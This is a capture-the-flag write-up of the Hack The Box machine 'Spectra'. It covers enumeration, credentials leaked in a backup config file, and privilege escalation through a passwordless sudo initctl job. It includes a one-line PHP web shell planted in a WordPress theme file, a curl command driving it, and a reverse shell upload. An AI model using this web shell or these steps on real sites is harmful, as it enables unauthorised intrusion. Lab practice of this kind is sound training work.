## Intro
This is an easy Linux box, where I had to get user through a forgotten "backup" on a dev instance, then the privesc came from an unsecured sudo command... Sounds straightforward ? Well, not that much!

## Target
[HTB - Spectra](https://app.hackthebox.eu/machines/317)

## Recon
A quick look to the box info reveals that it is a Linux's box, and that's it!

## Enum
We run our classic `nmap` scan :

```text
sudo nmap -sC -sV -oA scans\spectra
```

Only 3 ports are open : http, mysql, and SSH.

### Web enum

Since I found a website, I'll manually browse to it in order to have a quick look. In the mean time, I'll fire up a `gobuster` scan against the IP :

Main page shows 2 links pointing to [spectra.htb](http://spectra.htb), this means I need to modify our `/etc/hosts` file accordingly. One instance (main) is a working Wordpress, and the other one (testing) is a broken Wordpress.

Once this is done, I would generally run a few more `gobuster` scans in the background against those two instances and a `WPScan` on the working Wordpress :

```text

This scan didn't reveal anything useful, I also tried to brute force `administrator` user with a top 1000 passwords list from [SecLists](https://github.com/danielmiessler/SecLists). No luck.

I decided to run the `WPScan` first, while browsing manually the other (testing) instance. Pretty quickly, I figured out that `directory listing` was enabled on this instance, this means that browsing to `http://spectra.htb/testing/` instead of `http://spectra.htb/testing/index.php` gave me the full listing of files on the web root.

From here, I could spot a `wp-config.php.save` file that contained credentials to connect to the database. 

I tried connecting remotely, but MySQL wouldn't allow me to connect from my IP.

Finally, I tried logging on the working Wordpress' instance as `administrator` and with the password I found, and it worked! I was in!

## Exploitation

### Getting Initial Shell
Once you are logged with admin priv on a Wordpress, getting a shell is, as far as I have seen, very easy! Basically, it is about editing a theme (preferably an unused one), and adding a small line of `PHP` in order to get some kind of `RCE`.

In this case, I edited theme `twentyseven`, file `404.php` and added the following line : `echo system($_REQUEST['nes']);`

This means, that I can now run commands like so (directly in browser, or via Curl, Burp, etc) :

`curl http://spectra.htb/main/themes/twentyseven/404.php&nes=whoami`

From here, I like to use Burp, convert the request to `POST` and play around or simply get a better shell. 

On this particular box, I had several issues trying to get a proper shell. 

I decided to upload a full php reverse shell via curl... I then reached that URL to get my reverse shell, and... I couldn't [upgrade it](https://www.masoopy.com/cheatsheets/uprgrading-shells/)! However, I noticed that `nginx` user had a real shell inside `/etc/passwd`, so I uploaded my `ssh key` and connected as `nginx` over `SSH`!

From here, I ran `LinPeas` and spotted (not easily) and interesting file : `/etc/autologin/passwd`

#### Getting user
The password found allowed me to log in as `katie` via ssh, and allowed me to grab the `user flag` :

![Spectra - User Flag](/images/2021/07/Spectra_User_Flag.png)

### PrivEsc
Now that I have user, let's see if I can run sudo, and indeed I can run `sudo /sbin/initctl` without password. I headed over [GTFObins](https://gtfobins.github.io/), but unfortunately there was nothing there.

After a little exploration, I noticed that I could `edit` / `start` / `stop` services in `/etc/init/`, and found a particularly interesting one called test.conf.

![Spectra - Test Service](/images/2021/07/Spectra_Test_Service.png)

After more trial and errors, I simply decided to replace the `date` command by `cat /root/root.txt`, which got me the `root flag` from log file in `/var/log/nodetest.log` :

## Outro
This was another fun with quite a few unexpected hurdles. It was really cool to "think out of the box" and try to find (ugly) ways to overcome those issues.
